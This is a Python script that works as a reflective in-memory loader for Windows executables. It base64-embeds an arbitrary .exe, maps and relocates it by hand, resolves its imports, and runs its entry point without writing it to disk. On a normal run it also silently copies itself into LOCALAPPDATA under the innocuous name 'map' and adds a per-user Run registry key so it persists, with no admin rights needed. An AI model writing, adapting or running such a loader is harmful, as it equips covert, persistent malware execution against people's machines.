from __future__ import annotations

import argparse
import base64
import ctypes
import re
import struct
import os
import shutil
import subprocess
import sys
import winreg
from dataclasses import dataclass
from pathlib import Path

# >>> PE_B64_BEGIN
ENCODED_PE = """"""
# >>> PE_B64_END

MARK_BEGIN = "# >>> PE_B64_BEGIN"
MARK_END = "# >>> PE_B64_END"

# --- PE constants ---
IMAGE_DOS_SIGNATURE = 0x5A4D
IMAGE_NT_SIGNATURE = 0x00004550
IMAGE_FILE_MACHINE_AMD64 = 0x8664
IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B
IMAGE_DIRECTORY_ENTRY_IMPORT = 1
IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
IMAGE_REL_BASED_ABSOLUTE = 0
IMAGE_REL_BASED_HIGHLOW = 3
IMAGE_REL_BASED_DIR64 = 10
IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000
IMAGE_SCN_MEM_WRITE = 0x80000000


def u16(data: bytes, offset: int) -> int:
    return struct.unpack_from("<H", data, offset)[0]


def u32(data: bytes, offset: int) -> int:
    return struct.unpack_from("<I", data, offset)[0]


def u64(data: bytes, offset: int) -> int:
    return struct.unpack_from("<Q", data, offset)[0]


def align_up(value: int, alignment: int) -> int:
    mask = alignment - 1
    return (value + mask) & ~mask


@dataclass(frozen=True)
class SectionHeader:
    name: str
    virtual_size: int
    virtual_address: int
    size_of_raw_data: int
    pointer_to_raw_data: int
    characteristics: int

    @classmethod
    def from_bytes(cls, blob: bytes, offset: int) -> SectionHeader:
        raw_name = blob[offset : offset + 8]
        name = raw_name.split(b"\0", 1)[0].decode("ascii", errors="replace")
        return cls(
            name=name,
            virtual_size=u32(blob, offset + 8),
            virtual_address=u32(blob, offset + 12),
            size_of_raw_data=u32(blob, offset + 16),
            pointer_to_raw_data=u32(blob, offset + 20),
            characteristics=u32(blob, offset + 36),
        )


@dataclass(frozen=True)
class ParsedPE:
    data: bytes
    is_64: bool
    image_base: int
    size_of_image: int
    size_of_headers: int
    entry_point_rva: int
    section_alignment: int
    file_alignment: int
    sections: tuple[SectionHeader, ...]
    reloc_rva: int
    reloc_size: int
    import_rva: int
    import_size: int

    @property
    def pe_header_offset(self) -> int:
        return u32(self.data, 0x3C)

    @property
    def optional_header_offset(self) -> int:
        return self.pe_header_offset + 24

    @classmethod
    def parse(cls, data: bytes) -> ParsedPE:
        if len(data) < 64 or u16(data, 0) != IMAGE_DOS_SIGNATURE:
            raise ValueError("Not a valid DOS header (expected MZ)")
        e_lfanew = u32(data, 0x3C)
        if e_lfanew + 4 > len(data) or u32(data, e_lfanew) != IMAGE_NT_SIGNATURE:
            raise ValueError("Invalid PE signature")
        coff = e_lfanew + 4
        machine = u16(data, coff)
        num_sections = u16(data, coff + 2)
        optional_size = u16(data, coff + 16)
        optional = coff + 20
        magic = u16(data, optional)
        if magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC:
            raise ValueError("Only PE32+ (x64) is supported in this example")
        if machine != IMAGE_FILE_MACHINE_AMD64:
            raise ValueError(f"Unexpected machine 0x{machine:X}")
        image_base = u64(data, optional + 24)
        section_alignment = u32(data, optional + 32)
        file_alignment = u32(data, optional + 36)
        size_of_image = u32(data, optional + 56)
        size_of_headers = u32(data, optional + 60)
        entry_point_rva = u32(data, optional + 16)
        reloc_rva = u32(data, optional + 112 + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8)
        reloc_size = u32(data, optional + 112 + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8 + 4)
        import_rva = u32(data, optional + 112 + IMAGE_DIRECTORY_ENTRY_IMPORT * 8)
        import_size = u32(data, optional + 112 + IMAGE_DIRECTORY_ENTRY_IMPORT * 8 + 4)
        section_table = optional + optional_size
        sections = tuple(
            SectionHeader.from_bytes(data, section_table + i * 40) for i in range(num_sections)
        )
        return cls(
            data=data,
            is_64=True,
            image_base=image_base,
            size_of_image=size_of_image,
            size_of_headers=size_of_headers,
            entry_point_rva=entry_point_rva,
            section_alignment=section_alignment,
            file_alignment=file_alignment,
            sections=sections,
            reloc_rva=reloc_rva,
            reloc_size=reloc_size,
            import_rva=import_rva,
            import_size=import_size,
        )


@dataclass
class MappedImage:
    pe: ParsedPE
    memory: bytearray
    mapped_base: int

    @property
    def image_base(self) -> int:
        return self.pe.image_base

    def read_u64_at_rva(self, rva: int) -> int:
        return u64(self.memory, rva)


class InMemoryMapper:
    def map(self, pe_bytes: bytes, *, mapped_base: int | None = None) -> MappedImage:
        pe = ParsedPE.parse(pe_bytes)
        base = pe.image_base if mapped_base is None else mapped_base
        memory = bytearray(pe.size_of_image)
        header_bytes = min(pe.size_of_headers, len(pe_bytes))
        memory[0:header_bytes] = pe_bytes[0:header_bytes]
        for section in pe.sections:
            if section.size_of_raw_data == 0:
                continue
            src = section.pointer_to_raw_data
            size = min(section.size_of_raw_data, section.virtual_size or section.size_of_raw_data)
            dst = section.virtual_address
            memory[dst : dst + size] = pe_bytes[src : src + size]
        image = MappedImage(pe=pe, memory=memory, mapped_base=base)
        delta = base - pe.image_base
        if delta:
            _apply_relocations(image, delta)
        return image


def _apply_relocations(image: MappedImage, delta: int) -> None:
    pe = image.pe
    if pe.reloc_size == 0 or pe.reloc_rva == 0:
        raise ValueError(f"Rebase delta=0x{delta:X} but no relocation directory")
    mem = image.memory
    offset = pe.reloc_rva
    end = offset + pe.reloc_size
    while offset < end:
        page_rva = u32(mem, offset)
        block_size = u32(mem, offset + 4)
        if block_size < 8:
            break
        entry_offset = offset + 8
        block_end = offset + block_size
        while entry_offset < block_end:
            entry = u16(mem, entry_offset)
            entry_offset += 2
            reloc_type = entry >> 12
            reloc_offset = entry & 0xFFF
            target_rva = page_rva + reloc_offset
            if reloc_type == IMAGE_REL_BASED_ABSOLUTE:
                continue
            if reloc_type == IMAGE_REL_BASED_DIR64:
                value = u64(mem, target_rva)
                mem[target_rva : target_rva + 8] = ((value + delta) & 0xFFFFFFFFFFFFFFFF).to_bytes(
                    8, "little"
                )
            elif reloc_type == IMAGE_REL_BASED_HIGHLOW:
                value = u32(mem, target_rva)
                mem[target_rva : target_rva + 4] = ((value + delta) & 0xFFFFFFFF).to_bytes(4, "little")
            else:
                raise ValueError(f"Unsupported relocation type {reloc_type}")
        offset += block_size


def decode_pe(encoded: str | None = None) -> bytes:
    """Decode embedded base64 PE (or pass custom blob)."""
    raw = (encoded if encoded is not None else ENCODED_PE).strip()
    return base64.b64decode(raw, validate=True)


def embed_pe_file(exe_path: Path, target: Path | None = None) -> None:
    """Replace embedded PE in this script with base64 of ``exe_path``."""
    target = target or Path(__file__)
    b64 = base64.b64encode(exe_path.read_bytes()).decode("ascii")
    text = target.read_text(encoding="utf-8")
    block = f'{MARK_BEGIN}\nENCODED_PE = """{b64}"""\n{MARK_END}'
    if MARK_BEGIN not in text:
        raise RuntimeError("PE markers not found in target file")
    new_text = re.sub(
        rf"{re.escape(MARK_BEGIN)}.*?{re.escape(MARK_END)}",
        block,
        text,
        count=1,
        flags=re.DOTALL,
    )
    target.write_text(new_text, encoding="utf-8")
    print(f"Embedded {exe_path.name} ({exe_path.stat().st_size} bytes) into {target.name}")


def _section_copy_size(section: SectionHeader) -> int:
    """Bytes copied by the mapper (file padding after VirtualSize is not loaded)."""
    if section.size_of_raw_data == 0:
        return 0
    virtual = section.virtual_size or section.size_of_raw_data
    return min(section.size_of_raw_data, virtual)


def verify_sections(pe_bytes: bytes, image: MappedImage) -> None:
    pe = ParsedPE.parse(pe_bytes)
    for section in pe.sections:
        size = _section_copy_size(section)
        if size == 0:
            continue
        src = pe_bytes[section.pointer_to_raw_data : section.pointer_to_raw_data + size]
        mapped = bytes(image.memory[section.virtual_address : section.virtual_address + size])
        if src != mapped:
            raise RuntimeError(f"Section {section.name!r} mismatch after map")


def run_pe_windows(pe_bytes: bytes) -> int:
    if sys.platform != "win32":
        raise OSError("Execution requires Windows")
    from ctypes import wintypes

    MEM_COMMIT, MEM_RESERVE = 0x1000, 0x2000
    PAGE_READONLY, PAGE_READWRITE = 0x02, 0x04
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE = 0x20, 0x40

    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    VirtualAlloc = k32.VirtualAlloc
    VirtualAlloc.restype = ctypes.c_void_p
    VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    VirtualProtect = k32.VirtualProtect
    VirtualProtect.restype = wintypes.BOOL
    VirtualProtect.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
    ]
    LoadLibraryA = k32.LoadLibraryA
    LoadLibraryA.restype = ctypes.c_void_p
    LoadLibraryA.argtypes = [wintypes.LPCSTR]
    GetProcAddress = k32.GetProcAddress
    GetProcAddress.restype = ctypes.c_void_p
    GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_void_p]

    pe = ParsedPE.parse(pe_bytes)
    size = pe.size_of_image
    base = VirtualAlloc(ctypes.c_void_p(pe.image_base), size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    mapped_base = pe.image_base if base else None
    if not base:
        base = VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if not base:
            raise OSError(f"VirtualAlloc failed: {ctypes.get_last_error()}")
        mapped_base = base

    if mapped_base == pe.image_base:
        image = InMemoryMapper().map(pe_bytes)
    else:
        image = InMemoryMapper().map(pe_bytes, mapped_base=mapped_base)

    buf = (ctypes.c_char * len(image.memory)).from_buffer_copy(image.memory)
    ctypes.memmove(ctypes.c_void_p(base), buf, len(image.memory))

    def read_u32(rva: int) -> int:
        return ctypes.c_uint32.from_address(base + rva).value

    def read_u64(rva: int) -> int:
        return ctypes.c_uint64.from_address(base + rva).value

    def write_u64(rva: int, val: int) -> None:
        ctypes.c_uint64.from_address(base + rva).value = val & 0xFFFFFFFFFFFFFFFF

    def cstr(rva: int) -> bytes:
        addr = base + rva
        out = bytearray()
        while ctypes.c_uint8.from_address(addr).value:
            out.append(ctypes.c_uint8.from_address(addr).value)
            addr += 1
        return bytes(out)

    desc_rva = pe.import_rva
    while desc_rva:
        orig = read_u32(desc_rva)
        name_rva = read_u32(desc_rva + 12)
        first_thunk = read_u32(desc_rva + 16)
        if orig == 0 and name_rva == 0 and first_thunk == 0:
            break
        mod = LoadLibraryA(cstr(name_rva))
        if not mod:
            raise OSError(f"LoadLibraryA failed: {ctypes.get_last_error()}")
        lookup = orig or first_thunk
        i = 0
        while True:
            thunk = read_u64(lookup + i * 8)
            if not thunk:
                break
            if thunk & (1 << 63):
                proc = GetProcAddress(mod, ctypes.c_void_p(thunk & 0xFFFF))
            else:
                proc = GetProcAddress(mod, ctypes.c_void_p(base + thunk + 2))
            if not proc:
                raise OSError(f"GetProcAddress failed: {ctypes.get_last_error()}")
            write_u64(first_thunk + i * 8, proc)
            i += 1
        desc_rva += 20

    old = wintypes.DWORD()
    hdr = align_up(pe.size_of_headers, 0x1000)
    VirtualProtect(ctypes.c_void_p(base), hdr, PAGE_READONLY, ctypes.byref(old))
    for sec in pe.sections:
        if not sec.virtual_size and not sec.size_of_raw_data:
            continue
        sz = align_up(max(sec.virtual_size, sec.size_of_raw_data), 0x1000)
        if sec.characteristics & IMAGE_SCN_MEM_EXECUTE:
            prot = PAGE_EXECUTE_READWRITE if sec.characteristics & IMAGE_SCN_MEM_WRITE else PAGE_EXECUTE_READ
        elif sec.characteristics & IMAGE_SCN_MEM_WRITE:
            prot = PAGE_READWRITE
        elif sec.characteristics & IMAGE_SCN_MEM_READ:
            prot = PAGE_READONLY
        else:
            prot = PAGE_READWRITE
        VirtualProtect(ctypes.c_void_p(base + sec.virtual_address), sz, prot, ctypes.byref(old))

    entry = ctypes.CFUNCTYPE(ctypes.c_int)(base + pe.entry_point_rva)
    return entry()


AUTOSTART_VALUE_NAME = "map"
AUTOSTART_RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
LEGACY_AUTOSTART_VALUE = "PeInmemoryAutostart"
LEGACY_APP_FOLDER = "PeInmemory"
APP_FOLDER_NAME = "map"
INSTALLED_SCRIPT_NAME = "map.py"


def _install_dir() -> Path:
    local = os.environ.get("LOCALAPPDATA")
    if not local:
        raise SystemExit("LOCALAPPDATA is not set")
    return Path(local) / APP_FOLDER_NAME


def _installed_script_path() -> Path:
    return _install_dir() / INSTALLED_SCRIPT_NAME


def _command_for_script(script: Path) -> str:
    exe = Path(sys.executable).resolve()
    return f'"{exe}" -u "{script.resolve()}"'


def _deploy_script_to_appdata() -> Path:
    dest_dir = _install_dir()
    dest_dir.mkdir(parents=True, exist_ok=True)
    dest = _installed_script_path().resolve()
    src = Path(__file__).resolve()
    if src != dest:
        shutil.copy2(src, dest)
    return dest


def _log_file() -> Path:
    return _install_dir() / "log.txt"


def _log_error(exc: BaseException) -> None:
    import traceback

    try:
        _install_dir().mkdir(parents=True, exist_ok=True)
        with _log_file().open("a", encoding="utf-8") as fh:
            fh.write(traceback.format_exc())
            fh.write("\n---\n")
    except OSError:
        pass


def _wait_for_shell(timeout_sec: float = 120.0) -> None:
    """Run key fires early; GUI / CRT may crash until Explorer is up."""
    import time

    if sys.platform != "win32":
        return
    user32 = ctypes.windll.user32
    deadline = time.monotonic() + timeout_sec
    while time.monotonic() < deadline:
        if user32.GetShellWindow():
            time.sleep(3.0)
            return
        time.sleep(0.5)


def _cleanup_legacy_autostart() -> None:
    subprocess.run(
        ["schtasks", "/Delete", "/F", "/TN", LEGACY_AUTOSTART_VALUE],
        capture_output=True,
        text=True,
    )
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, LEGACY_AUTOSTART_VALUE)
    except FileNotFoundError:
        pass
    local = os.environ.get("LOCALAPPDATA")
    if local:
        legacy_dir = Path(local) / LEGACY_APP_FOLDER
        legacy_script = legacy_dir / "pe_inmemory.py"
        if legacy_script.is_file():
            legacy_script.unlink(missing_ok=True)
        try:
            legacy_dir.rmdir()
        except OSError:
            pass


def _ensure_autostart() -> None:
    """Copy script to AppData and register HKCU Run (silent, no admin)."""
    _cleanup_legacy_autostart()
    installed = _deploy_script_to_appdata()
    tr = _command_for_script(installed)
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, AUTOSTART_VALUE_NAME, 0, winreg.REG_SZ, tr)


def run_checks(pe_bytes: bytes) -> None:
    info = ParsedPE.parse(pe_bytes)
    mapped = InMemoryMapper().map(pe_bytes)
    verify_sections(pe_bytes, mapped)
    print(f"Decoded PE: {len(pe_bytes)} bytes, PE32+, sections={len(info.sections)}")
    print(f"  ImageBase=0x{info.image_base:X} SizeOfImage=0x{info.size_of_image:X} EP=0x{info.entry_point_rva:X}")
    print("  All mapped sections match file: OK")


def main() -> None:
    if "--_child" in sys.argv:
        _wait_for_shell()
        run_pe_windows(decode_pe())
        return

    parser = argparse.ArgumentParser(description="Single-file in-memory PE mapper")
    parser.add_argument(
        "--check",
        action="store_true",
        help="Only map/verify embedded PE (print info, do not execute)",
    )
    parser.add_argument(
        "--embed",
        metavar="FILE.exe",
        type=Path,
        help="Embed FILE as base64 into this script (auto-replace PE blob)",
    )
    args = parser.parse_args()

    if args.embed:
        embed_pe_file(args.embed.resolve())
        return

    pe_bytes = decode_pe()

    if args.check:
        run_checks(pe_bytes)
        return

    if sys.platform != "win32":
        raise SystemExit(1)

    _ensure_autostart()

    script = str(Path(__file__).resolve())
    raise SystemExit(
        subprocess.run(
            [sys.executable, "-u", script, "--_child"],
            check=False,
        ).returncode
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        _log_error(exc)
        raise
